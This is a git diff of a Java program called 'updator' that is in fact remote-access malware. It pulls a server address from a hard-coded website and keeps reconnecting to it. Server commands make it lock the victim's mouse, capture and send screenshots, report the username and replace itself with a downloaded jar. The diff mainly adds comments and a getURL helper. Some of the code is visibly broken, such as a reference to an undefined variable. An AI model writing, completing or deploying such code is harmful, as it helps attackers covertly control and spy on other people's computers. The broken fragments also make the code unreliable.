@@ -8,43 +8,42 @@ import javax.swing.*;
 import javax.imageio.*;
 
 public class updator{
-	public static final int version = 1;
+	public static final int version = 1;	//Version
 	static int id = 0;
-	static String connectTo = "";
 	
 	public static void main(String args[]) throws Exception{
-		URL oracle = new URL("http://leedavida.my-free.website/");
-        Scanner inSt = new Scanner(oracle.openStream());
+		Socket s = establishTo();
 
-        String inputLine = "";
-        while (!inputLine.equals("connectTo")){
-            inputLine = inSt.next();
-			System.out.println(inputLine);
-		}		
-		
-		
-		updator.connectTo = inSt.next();
-		Socket s = establishTo(updator.connectTo);
-		
-		setUp(s);		
+		setUp(s);				
 	}
-	public static void copy(InputStream in, OutputStream out) throws IOException {
-        byte[] buf = new byte[1024];
-        int len = 0;
-        while ((len = in.read(buf)) == 1024) {
-            out.write(buf, 0, len);
+	public static String getURL(){		//Return the URL
+		URL web = new URL("http://leedavida.my-free.website/");
+		Scanner inSt = new Scanner(web.openStream());
+
+		String inputLine = "";
+		while (!inputLine.equals("connectTo")){
+		    inputLine = inSt.next();
+		}	
+		return in.next();
+	}
+
+	public static void copy(InputStream in, OutputStream out) throws IOException {		//Copies input to output stream -- Copied from StackOverflow
+		byte[] buf = new byte[1024];
+		int len = 0;
+		while ((len = in.read(buf)) == 1024) {
+		    	out.write(buf, 0, len);
 			System.out.println(len);
-        }
-            out.write(buf, 0, len);
-			System.out.println(len);
-    }
-	public static void setUp(Socket s){
+		}
+        	out.write(buf, 0, len);
+		System.out.println(len);
+	}
+	public static void setUp(Socket s){		//Setup the socket and respective threads
 		try{
 		PrintStream print = new PrintStream(s.getOutputStream());
 		Scanner in = new Scanner(s.getInputStream());
-		print.println(updator.version);
+		print.println(updator.version);		//Push current version to server
 		
-		if(in.nextBoolean()){
+		if(in.nextBoolean()){		//Supposed to update from afar
 			File update = new File("updator.jar");
 			if(!update.exists()){
 				update.createNewFile();
@@ -63,17 +62,17 @@ public class updator{
 			e.printStackTrace();
 		}
 	}
-	public static Socket establishTo(String connectTo){
+	public static Socket establishTo(){		//Get the socket
 		Socket s = null;
 		try{
 			boolean connected = false;
 			while(!connected){
 				try{
-				s = new Socket(connectTo,8889);
+				s = new Socket(getURL(),8889);
 				connected = true;
 				}catch(Exception e){
 					e.printStackTrace();
-					System.out.println(connectTo);
+					System.out.println(getURL());
 				}
 			}
 		}catch(Exception e){
@@ -82,7 +81,7 @@ public class updator{
 		return s;
 	}
 }
-class uListener implements Runnable{
+class uListener implements Runnable{		//Listens for commands from server
 	Socket s;
 	Scanner in;
 	public uListener(Socket s){
@@ -100,18 +99,18 @@ class uListener implements Runnable{
 			try{
 				String type = in.next();
 				if(type.equals("com")){
-					commands.decode(in.nextLine());
+					commands.decode(in.nextLine());		//Decode to commands
 				}
-			}catch(NoSuchElementException e){
+			}catch(NoSuchElementException e){		//The server closed
 				System.out.println("GOTCHA");
 				
-				updator.setUp(updator.establishTo(updator.connectTo));
+				updator.setUp(updator.establishTo());
 				break;
 			}
 		}
 	}
 }
-class commands implements Runnable{
+class commands implements Runnable{		//Command decoder
 	static int mx = 0;
 	static int my = 0;
 	
@@ -134,10 +133,10 @@ class commands implements Runnable{
 			int counter = 0;
 			while(true){		
 				try{
-					if(commands.mx != 0 || commands.my != 0){
+					if(commands.mx != 0 || commands.my != 0){		//Lock mouse
 						r.mouseMove(commands.mx, commands.my);
 					}
-					if(commands.send && counter % 5 == 0){
+					if(commands.send && counter % 5 == 0){		//DOES NOT WORK --- FIX
 						Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
 						BufferedImage image = r.createScreenCapture(new Rectangle(0,0,(int)size.getWidth(),(int)size.getHeight()));
 						ByteArrayOutputStream bOut = new ByteArrayOutputStream();
@@ -149,7 +148,7 @@ class commands implements Runnable{
 						out.flush();
 					}
 					Thread.sleep(10);
-				}catch(Exception e){}
+				}catch(Exception e){e.printStackTrace();}
 			}
 		}catch(Exception e){
 			e.printStackTrace();
@@ -185,7 +184,7 @@ class commands implements Runnable{
 			}catch(IOException e){
 				e.printStackTrace();
 			}
-		}else if(type.equals("ping")){
+		}else if(type.equals("ping")){		//Print username to server
 			PrintStream print = new PrintStream(outStream);
 			
 			print.println("info " + System.getProperty("user.name"));
